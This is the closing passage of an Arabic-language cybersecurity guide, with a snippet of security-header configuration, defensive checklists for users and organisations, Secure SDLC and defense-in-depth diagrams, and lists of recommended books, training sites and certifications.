    .contentSecurityPolicy("default-src 'self'")
    .xssProtection()
    .frameOptions().deny()
    .httpStrictTransportSecurity();

// ✅ تسجيل الأحداث الأمنية
log.warn("Failed login attempt for user: {}", username);
```

### 2. للمستخدمين

```
✅ استخدام كلمات مرور قوية وفريدة
✅ تفعيل المصادقة الثنائية (2FA)
✅ تحديث البرامج بانتظام
✅ الحذر من رسائل التصيد
✅ استخدام VPN على الشبكات العامة
✅ النسخ الاحتياطي للبيانات المهمة
✅ مراجعة أذونات التطبيقات
```

### 3. للمؤسسات

```
✅ تطبيق سياسات أمن قوية
✅ تدريب الموظفين على الأمن السيبراني
✅ إجراء تقييمات دورية للمخاطر
✅ تطبيق Principle of Least Privilege
✅ المراقبة المستمرة للأنظمة
✅ خطة الاستجابة للحوادث
✅ النسخ الاحتياطي والتعافي من الكوارث
✅ اختبار الاختراق الدوري
```

### 4. Secure SDLC

```
Requirements → Design → Development → Testing → Deployment → Maintenance
     ↓           ↓           ↓           ↓           ↓           ↓
 Security    Threat      Secure     Security    Security   Patch
 Analysis    Modeling    Coding     Testing     Hardening  Management
```

### 5. Defense in Depth

```
┌─────────────────────────────────────┐
│  Physical Security                  │
│  ┌───────────────────────────────┐  │
│  │  Perimeter Security           │  │
│  │  ┌─────────────────────────┐  │  │
│  │  │  Network Security       │  │  │
│  │  │  ┌───────────────────┐  │  │  │
│  │  │  │  Host Security    │  │  │  │
│  │  │  │  ┌─────────────┐  │  │  │  │
│  │  │  │  │ Application │  │  │  │  │
│  │  │  │  │  Security   │  │  │  │  │
│  │  │  │  │  ┌───────┐  │  │  │  │  │
│  │  │  │  │  │ Data  │  │  │  │  │  │
│  │  │  │  │  └───────┘  │  │  │  │  │
│  │  │  │  └─────────────┘  │  │  │  │
│  │  │  └───────────────────┘  │  │  │
│  │  └─────────────────────────┘  │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

---

## الخلاصة

الأمن السيبراني ليس منتجاً يمكن شراؤه، بل هو عملية مستمرة تتطلب:

1. **الوعي والتعليم المستمر**
2. **تطبيق أفضل الممارسات**
3. **المراقبة والتحديث الدائم**
4. **التخطيط للاستجابة للحوادث**
5. **التعاون بين جميع الأطراف**

> "الأمان ليس مسؤولية شخص واحد، بل مسؤولية الجميع"

---

## مصادر إضافية

### كتب موصى بها:
- The Web Application Hacker's Handbook
- Metasploit: The Penetration Tester's Guide
- Network Security Essentials
- Cryptography and Network Security by William Stallings

### مواقع تعليمية:
- OWASP (Open Web Application Security Project)
- SANS Institute
- Cybrary
- Hack The Box
- TryHackMe

### شهادات معتمدة:
- CEH (Certified Ethical Hacker)
- CISSP (Certified Information Systems Security Professional)
- CompTIA Security+
- OSCP (Offensive Security Certified Professional)
- CISM (Certified Information Security Manager)

---

تم إعداد هذا الدليل لتوفير فهم شامل للأمن السيبراني. للمزيد من الأسئلة والاستفسارات، يرجى الرجوع إلى ملف أسئلة المقابلات المرفق.
